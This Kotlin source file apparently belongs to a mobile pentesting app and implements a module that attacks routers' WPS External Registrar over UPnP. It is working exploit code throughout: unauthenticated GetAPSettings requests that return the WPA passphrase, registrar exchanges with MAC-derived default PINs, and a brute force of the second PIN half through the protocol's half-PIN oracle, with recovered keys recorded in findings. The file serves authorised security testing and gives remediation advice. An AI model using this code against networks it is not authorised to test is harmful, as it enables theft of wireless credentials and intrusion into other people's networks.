package dev.cyphernova.mobileops.modules.tier0

import dev.cyphernova.mobileops.core.beacon.BeaconElements
import dev.cyphernova.mobileops.core.capability.Tier
import dev.cyphernova.mobileops.core.evidence.Finding
import dev.cyphernova.mobileops.core.evidence.Severity
import dev.cyphernova.mobileops.core.exploit.UpnpLocations
import dev.cyphernova.mobileops.core.exploit.UpnpWps
import dev.cyphernova.mobileops.core.exploit.Wsc
import dev.cyphernova.mobileops.core.exploit.WpsPin
import dev.cyphernova.mobileops.core.exploit.WpsRegistrarExchange
import dev.cyphernova.mobileops.core.module.Intrusiveness
import dev.cyphernova.mobileops.core.module.ModuleCategory
import dev.cyphernova.mobileops.core.module.ModuleContext
import dev.cyphernova.mobileops.core.module.ModuleOutcome
import dev.cyphernova.mobileops.core.module.PentestModule

/**
 * Exploits the WPS External Registrar where it is exposed over UPnP.
 *
 * This is the only classic WPS attack an unrooted phone can reach. Over the air, WPS runs in
 * EAP frames that need monitor mode and injection to send; over UPnP it is ordinary HTTP on the
 * LAN, and a great deal of consumer firmware enables it by default.
 *
 * The module works from cheapest to most expensive:
 *
 *  1. `GetDeviceInfo` — does the registrar answer an unauthenticated caller at all?
 *  2. `GetAPSettings` — some firmware hands over the SSID and passphrase for the asking, with no
 *     PIN and no exchange. Always worth one request.
 *  3. The registrar exchange with PINs derived from the AP's own MAC address. A long line of
 *     routers generated their default PIN from the MAC with a published function, so the sticker
 *     PIN is computable rather than guessable.
 *  4. If a candidate gets the first four digits right, the protocol says so — and the remaining
 *     search is a thousand possibilities, which is finished here rather than left as an exercise.
 *
 * The exchange is aborted with a NACK after M7 rather than completed with M8: a real M8 pushes
 * new settings onto the AP, and this must leave the network as it found it.
 */
class WpsRegistrarModule : PentestModule {
    override val id = "t0.exploit.wpsregistrar"
    override val title = "WPS registrar attack"
    override val description =
        "Attacks the WPS External Registrar over UPnP — the one WPS path reachable without " +
            "monitor mode. Tries unauthenticated settings retrieval, then MAC-derived default " +
            "PINs, then finishes a half-recovered PIN. Recovers the passphrase where it works."
    override val requiredTier = Tier.T0_STOCK
    override val intrusiveness = Intrusiveness.ACTIVE
    override val category = ModuleCategory.EXPLOIT
    override val requiresTarget = true

    // The description location comes out of SSDP. Guessing at ports does not work.
    override val prerequisites = listOf("t0.net.services")

    override suspend fun run(
        context: ModuleContext,
        emit: suspend (Finding) -> Unit,
    ): ModuleOutcome {
        val hosts = context.targets.hosts()
        if (hosts.isEmpty()) return ModuleOutcome.Blocked("No hosts selected.")

        var probed = 0
        var reachable = 0
        var recovered = 0

        hosts.forEach { host ->
            val advertised = UpnpLocations.advertisedRegistrar(context.priorFindings, host) != null
            val search = findDescription(context, host)
            if (!search.found) {
                // A host that never advertised a registrar is not a WPS target, and saying so
                // once per address turns a segment sweep into a page of identical notes. Only
                // the hosts that did advertise one are worth a finding when they then fail.
                if (advertised) {
                    emit(
                        note(
                            host,
                            "WPS registrar advertised but its description did not answer — $host",
                            host,
                            "Service discovery recorded a WPS External Registrar on this host, " +
                                "so the description should be there. It was asked for and it did " +
                                "not arrive. What each attempt actually did: " +
                                search.attempted.joinToString("; ") { it.describe() } + ". " +
                                "A refused connection means the daemon is not listening on the " +
                                "port it advertised; a timeout means it is listening and not " +
                                "replying; an HTTP status means it replied with something that " +
                                "was not a device description.",
                            data = mapOf(
                                "attempted" to search.attempted.joinToString { it.describe() },
                                "advertised_registrar" to "true",
                            ),
                        ),
                    )
                }
                return@forEach
            }
            probed++

            val service = UpnpWps.findWpsService(search.body!!, search.url!!)
            if (service == null) {
                emit(
                    note(
                        host,
                        "No WPS registrar service on $host",
                        host,
                        "The UPnP description at ${search.url} does not advertise " +
                            "WFAWLANConfig, so there is no registrar reachable over UPnP here.",
                    ),
                )
                return@forEach
            }

            val m1 = fetchM1(service)
            if (m1 == null) {
                emit(
                    note(
                        host,
                        "Registrar did not hand over device info on $host",
                        service.controlUrl,
                        "${service.serviceType} is advertised at ${service.controlUrl}, but " +
                            "GetDeviceInfo returned no M1 message. The service is present and " +
                            "either refusing or not answering, which is the correct behaviour.",
                        data = mapOf("control_url" to service.controlUrl),
                    ),
                )
                return@forEach
            }

            reachable++
            emit(reachableFinding(host, service, m1))

            if (tryApSettings(host, service, emit)) {
                recovered++
                return@forEach
            }

            if (runPinAttack(host, service, m1, emit)) recovered++
        }

        return when {
            probed == 0 -> ModuleOutcome.Completed("No UPnP device description found on the selected host(s).")
            recovered > 0 -> ModuleOutcome.Completed("$recovered network key(s) recovered.")
            reachable > 0 -> ModuleOutcome.Completed(
                "$reachable registrar(s) answered unauthenticated; no key recovered.",
            )
            else -> ModuleOutcome.Completed("$probed device(s) probed, none exposed an open registrar.")
        }
    }

    private suspend fun fetchM1(service: UpnpWps.ServiceEndpoint): ByteArray? {
        val response = LanHttpClient.probe(
            url = service.controlUrl,
            method = "POST",
            body = UpnpWps.getDeviceInfoEnvelope(service.serviceType),
            headers = soapHeaders(service, UpnpWps.ACTION_GET_DEVICE_INFO),
            timeoutMs = REQUEST_TIMEOUT_MS,
        ) ?: return null
        return UpnpWps.extractDeviceInfo(response.body)
    }

    private fun reachableFinding(
        host: String,
        service: UpnpWps.ServiceEndpoint,
        m1: ByteArray,
    ): Finding {
        val wps = BeaconElements.parseWps(m1)
        val enrollee = WpsRegistrarExchange(m1) { null }.enrollee()
        val mac = enrollee?.macAddress?.joinToString(":") { "%02X".format(it) }

        return Finding(
            moduleId = id,
            observedAtEpochMs = System.currentTimeMillis(),
            severity = Severity.HIGH,
            title = "WPS registrar answers unauthenticated on $host",
            subject = service.controlUrl,
            detail = buildString {
                append(
                    "GetDeviceInfo returned a ${m1.size}-byte WPS M1 message with no " +
                        "authentication, so the registrar protocol has begun with an " +
                        "unauthenticated caller. ",
                )
                wps?.let { info ->
                    info.manufacturer?.let { append("Manufacturer $it. ") }
                    info.modelName?.let { append("Model $it. ") }
                    info.serialNumber?.let { append("Serial $it. ") }
                }
                mac?.let { append("Enrollee MAC $it. ") }
                append(
                    "This path is independent of the radio-side PIN lock: an AP that refuses PIN " +
                        "attempts over the air can still be driven here. Disable WPS and UPnP on " +
                        "the LAN.",
                )
            },
            data = buildMap {
                put("control_url", service.controlUrl)
                put("m1_bytes", m1.size.toString())
                put("enrollee_mac", mac.orEmpty())
                wps?.let { info ->
                    put("manufacturer", info.manufacturer.orEmpty())
                    put("model", info.modelName.orEmpty())
                    put("serial", info.serialNumber.orEmpty())
                }
            },
        )
    }

    /**
     * The free win. Firmware that exposes GetAPSettings without checking the caller has completed
     * a registrar exchange returns the live configuration — including the passphrase — to one
     * unauthenticated SOAP request.
     */
    private suspend fun tryApSettings(
        host: String,
        service: UpnpWps.ServiceEndpoint,
        emit: suspend (Finding) -> Unit,
    ): Boolean {
        val response = LanHttpClient.probe(
            url = service.controlUrl,
            method = "POST",
            body = UpnpWps.getApSettingsEnvelope(service.serviceType),
            headers = soapHeaders(service, UpnpWps.ACTION_GET_AP_SETTINGS),
            timeoutMs = REQUEST_TIMEOUT_MS,
        ) ?: return false

        if (UpnpWps.isSoapFault(response.body)) return false
        val settings = UpnpWps.extractMessage(response.body, "NewAPSettings") ?: return false
        val attributes = Wsc.parse(settings)
        val key = Wsc
            .first(attributes, Wsc.Attr.NETWORK_KEY)
            ?.toString(Charsets.UTF_8)
            ?.takeIf { it.isNotBlank() }
            ?: return false
        val ssid = Wsc
            .first(attributes, Wsc.Attr.SSID)
            ?.toString(Charsets.UTF_8)

        emit(
            Finding(
                moduleId = id,
                observedAtEpochMs = System.currentTimeMillis(),
                severity = Severity.CRITICAL,
                title = "WPA passphrase retrieved without authentication from $host",
                subject = ssid ?: host,
                detail = "GetAPSettings returned the AP's live wireless configuration to a single " +
                    "unauthenticated SOAP request — no PIN, no registrar exchange, no attempt " +
                    "limit. Anyone who can reach this device on the LAN, including a guest on the " +
                    "guest network if it is not isolated, can read the main network's passphrase. " +
                    "Network '${ssid ?: "unknown"}', key '$key'. Disable UPnP and WPS immediately.",
                data = mapOf(
                    "ssid" to ssid.orEmpty(),
                    "network_key" to key,
                    "control_url" to service.controlUrl,
                    "method" to "GetAPSettings (unauthenticated)",
                ),
            ),
        )
        return true
    }

    /**
     * Runs the registrar exchange against derived PIN candidates.
     *
     * The protocol leaks which half of the PIN was wrong, so a candidate that fails at M6 rather
     * than M4 has already given up the first four digits. That turns the remainder into a
     * thousand-guess search, which is finished here.
     */
    private suspend fun runPinAttack(
        host: String,
        service: UpnpWps.ServiceEndpoint,
        m1: ByteArray,
        emit: suspend (Finding) -> Unit,
    ): Boolean {
        val enrollee = WpsRegistrarExchange(m1) { null }.enrollee() ?: return false
        val mac = enrollee.macAddress.joinToString(":") { "%02X".format(it) }

        val deadline = System.currentTimeMillis() + ATTACK_BUDGET_MS
        val candidates = WpsPin.candidatesFor(mac)
        var attempts = 0
        var oracleConfirmed = false
        var knownFirstHalf: String? = null

        for (candidate in candidates) {
            if (System.currentTimeMillis() > deadline) break
            attempts++
            val result = attemptPin(service, candidate.pin)
                ?: return interruptedAndReport(host, service, attempts, emit)
            when (result) {
                is WpsRegistrarExchange.Attempt.Recovered -> {
                    emit(recoveredFinding(host, service, result, candidate.algorithm, attempts))
                    return true
                }

                is WpsRegistrarExchange.Attempt.FirstHalfWrong -> oracleConfirmed = true

                is WpsRegistrarExchange.Attempt.SecondHalfWrong -> {
                    oracleConfirmed = true
                    knownFirstHalf = candidate.pin.substring(0, 4)
                    break
                }

                is WpsRegistrarExchange.Attempt.Interrupted -> {
                    // An AP that stops answering mid-exchange has usually rate-limited or locked.
                    // Continuing would just produce more of the same.
                    if (attempts >= INTERRUPT_TOLERANCE) {
                        emit(interruptedFinding(host, service, result, attempts))
                        return false
                    }
                }
            }
        }

        if (knownFirstHalf != null) {
            emit(halfRecoveredFinding(host, service, knownFirstHalf, attempts))
            val completed = completeSecondHalf(service, knownFirstHalf, deadline)
            if (completed != null) {
                emit(recoveredFinding(host, service, completed, "PIN oracle brute force", attempts))
                return true
            }
        }

        if (oracleConfirmed) {
            emit(oracleFinding(host, service, attempts))
        } else {
            emit(
                note(
                    host,
                    "No derived PIN accepted on $host",
                    service.controlUrl,
                    "$attempts derived candidate(s) were tried against the registrar and none was " +
                        "accepted, and the AP did not distinguish which half of the PIN was wrong. " +
                        "That is the behaviour of firmware that either locks out or does not leak " +
                        "the half-PIN result. The registrar answering unauthenticated at all is " +
                        "still worth closing.",
                    data = mapOf("attempts" to attempts.toString()),
                ),
            )
        }
        return false
    }

    /**
     * The second half of a WPS PIN is four digits of which the last is a checksum, so there are
     * only a thousand of them. With the first half known, the whole PIN is within reach in one
     * module run.
     */
    private suspend fun completeSecondHalf(
        service: UpnpWps.ServiceEndpoint,
        firstHalf: String,
        deadline: Long,
    ): WpsRegistrarExchange.Attempt.Recovered? {
        val prefix = firstHalf.toIntOrNull() ?: return null
        for (body in 0 until 1_000) {
            if (System.currentTimeMillis() > deadline) return null
            // The eighth digit is determined by the other seven, so the second half is a
            // thousand values rather than ten thousand.
            val result = attemptPin(service, WpsPin.withChecksum(prefix * 1_000 + body)) ?: return null
            if (result is WpsRegistrarExchange.Attempt.Recovered) return result
            if (result is WpsRegistrarExchange.Attempt.Interrupted) return null
        }
        return null
    }

    /**
     * One PIN attempt against a freshly fetched M1.
     *
     * The registrar session is stateful: the enrollee nonce and public key in M1 belong to one
     * exchange, and reusing them for a second attempt fails for reasons that have nothing to do
     * with the PIN. Each attempt therefore starts from its own GetDeviceInfo.
     */
    private suspend fun attemptPin(
        service: UpnpWps.ServiceEndpoint,
        pin: String,
    ): WpsRegistrarExchange.Attempt? {
        val fresh = fetchM1(service) ?: return null
        return WpsRegistrarExchange(fresh) { message -> putMessage(service, message) }.attempt(pin)
    }

    private suspend fun interruptedAndReport(
        host: String,
        service: UpnpWps.ServiceEndpoint,
        attempts: Int,
        emit: suspend (Finding) -> Unit,
    ): Boolean {
        emit(
            note(
                host,
                "Registrar stopped answering on $host",
                service.controlUrl,
                "After $attempts attempt(s) the registrar stopped returning device info, so the " +
                    "exchange cannot continue. An AP that stops answering part-way through has " +
                    "usually rate-limited or entered a lockout, which is the defence working. " +
                    "Many such locks clear on reboot or after a timeout, so it is worth retrying.",
                data = mapOf("attempts" to attempts.toString()),
            ),
        )
        return false
    }

    private fun recoveredFinding(
        host: String,
        service: UpnpWps.ServiceEndpoint,
        result: WpsRegistrarExchange.Attempt.Recovered,
        method: String,
        attempts: Int,
    ) = Finding(
        moduleId = id,
        observedAtEpochMs = System.currentTimeMillis(),
        severity = Severity.CRITICAL,
        title = "WPA passphrase recovered via WPS on $host",
        subject = result.ssid ?: host,
        detail = "The registrar exchange completed with PIN ${result.pin} ($method) after " +
            "$attempts attempt(s), and the AP returned its live configuration. " +
            "Network '${result.ssid ?: "unknown"}', key '${result.networkKey ?: "not returned"}'" +
            (result.authType?.let { ", $it" } ?: "") +
            (result.encryptionType?.let { "/$it" } ?: "") +
            ". Anyone on this LAN can read the wireless passphrase, and a default PIN derived " +
            "from the MAC address means anyone within radio range can too. Disable WPS on the AP; " +
            "changing the passphrase alone does not close this.",
        data = mapOf(
            "ssid" to result.ssid.orEmpty(),
            "network_key" to result.networkKey.orEmpty(),
            "wps_pin" to result.pin,
            "auth_type" to result.authType.orEmpty(),
            "encryption_type" to result.encryptionType.orEmpty(),
            "method" to method,
            "attempts" to attempts.toString(),
            "control_url" to service.controlUrl,
        ),
    )

    private fun halfRecoveredFinding(
        host: String,
        service: UpnpWps.ServiceEndpoint,
        firstHalf: String,
        attempts: Int,
    ) = Finding(
        moduleId = id,
        observedAtEpochMs = System.currentTimeMillis(),
        severity = Severity.HIGH,
        title = "First half of the WPS PIN recovered on $host",
        subject = service.controlUrl,
        detail = "After $attempts attempt(s) the AP rejected at M6 rather than M4, which means " +
            "the first four digits — $firstHalf — are correct. The protocol validates each half " +
            "separately and says which one failed, so the remaining search is a thousand " +
            "possibilities rather than ten million. Finishing it now.",
        data = mapOf("first_half" to firstHalf, "attempts" to attempts.toString()),
    )

    private fun oracleFinding(host: String, service: UpnpWps.ServiceEndpoint, attempts: Int) = Finding(
        moduleId = id,
        observedAtEpochMs = System.currentTimeMillis(),
        severity = Severity.HIGH,
        title = "WPS half-PIN oracle confirmed on $host",
        subject = service.controlUrl,
        detail = "Across $attempts attempt(s) the AP distinguished a wrong first half from a wrong " +
            "second half by refusing at different points in the exchange. That is the WPS design " +
            "flaw itself, and it is live here over UPnP where the radio-side PIN lockout does not " +
            "apply: the full PIN is recoverable in about eleven thousand attempts, which this " +
            "path serves at HTTP speed rather than radio speed. Disable WPS.",
        data = mapOf("attempts" to attempts.toString(), "control_url" to service.controlUrl),
    )

    private fun interruptedFinding(
        host: String,
        service: UpnpWps.ServiceEndpoint,
        result: WpsRegistrarExchange.Attempt.Interrupted,
        attempts: Int,
    ) = note(
        host,
        "Registrar stopped answering on $host",
        service.controlUrl,
        "The exchange broke down at ${result.stage} after $attempts attempt(s): ${result.detail} " +
            "An AP that stops mid-exchange has usually rate-limited or entered a lockout, which " +
            "is the defence working. It is worth retrying later to see whether the lock clears — " +
            "many clear on reboot or after a timeout.",
        data = mapOf("stage" to result.stage, "attempts" to attempts.toString()),
    )

    private fun note(
        host: String,
        title: String,
        subject: String,
        detail: String,
        data: Map<String, String> = emptyMap(),
    ) = Finding(
        moduleId = id,
        observedAtEpochMs = System.currentTimeMillis(),
        severity = Severity.INFO,
        title = title,
        subject = subject,
        detail = detail,
        data = data + ("host" to host),
    )

    private suspend fun putMessage(
        service: UpnpWps.ServiceEndpoint,
        message: ByteArray,
    ): ByteArray? {
        val response = LanHttpClient.probe(
            url = service.controlUrl,
            method = "POST",
            body = UpnpWps.putMessageEnvelope(service.serviceType, message),
            headers = soapHeaders(service, UpnpWps.ACTION_PUT_MESSAGE),
            timeoutMs = REQUEST_TIMEOUT_MS,
        ) ?: return null
        return UpnpWps.extractMessage(response.body, "NewOutMessage")
    }

    private fun soapHeaders(service: UpnpWps.ServiceEndpoint, action: String) = mapOf(
        "Content-Type" to "text/xml; charset=\"utf-8\"",
        "SOAPAction" to UpnpWps.soapAction(service.serviceType, action),
    )

    /** A description document, and every URL that was tried to find it. */
    private data class DescriptionSearch(
        val url: String?,
        val body: String?,
        val attempted: List<LanHttpClient.Attempt>,
    ) {
        val found: Boolean get() = url != null && body != null
    }

    /**
     * Finds the UPnP description document for a host.
     *
     * The ordering lives in [UpnpLocations]: what SSDP advertised first, habitual ports only as a
     * fallback. This walks that list and keeps the first document that is actually a description.
     */
    private suspend fun findDescription(
        context: ModuleContext,
        host: String,
    ): DescriptionSearch {
        val attempted = mutableListOf<LanHttpClient.Attempt>()
        val guesses = DESCRIPTION_CANDIDATES.map { (port, path) -> "http://$host:$port$path" }

        UpnpLocations.candidatesFor(context.priorFindings, host, guesses).forEach { url ->
            // Every outcome is recorded, not just the successes. A refused port, a timeout and a
            // page that arrived without a service list are three different problems, and a
            // report that collapses them into "nothing answered" cannot tell them apart.
            val attempt = LanHttpClient.attempt(url, timeoutMs = DESCRIPTION_TIMEOUT_MS)
            attempted += attempt
            val response = (attempt as? LanHttpClient.Attempt.Answered)?.response ?: return@forEach
            if (response.isSuccess && response.body.contains("<serviceType>", ignoreCase = true)) {
                return DescriptionSearch(url, response.body, attempted)
            }
        }
        return DescriptionSearch(null, null, attempted)
    }

    private companion object {
        const val REQUEST_TIMEOUT_MS = 8_000
        const val DESCRIPTION_TIMEOUT_MS = 4_000

        /**
         * A module run has to end. Ninety seconds is enough for every derived candidate and a
         * good part of a thousand-guess second half; a lockout will have shown itself long before.
         */
        const val ATTACK_BUDGET_MS = 90_000L

        /** How many broken exchanges to absorb before concluding the AP has stopped playing. */
        const val INTERRUPT_TOLERANCE = 3

        /**
         * Port 49152 is the first dynamic port and where consumer routers overwhelmingly put the
         * WPS description; the rest cover the common alternatives.
         */
        val DESCRIPTION_CANDIDATES = listOf(
            49152 to "/wps_device.xml",
            49152 to "/rootDesc.xml",
            49152 to "/description.xml",
            5000 to "/rootDesc.xml",
            8200 to "/rootDesc.xml",
            80 to "/rootDesc.xml",
            1900 to "/rootDesc.xml",
        )
    }
}
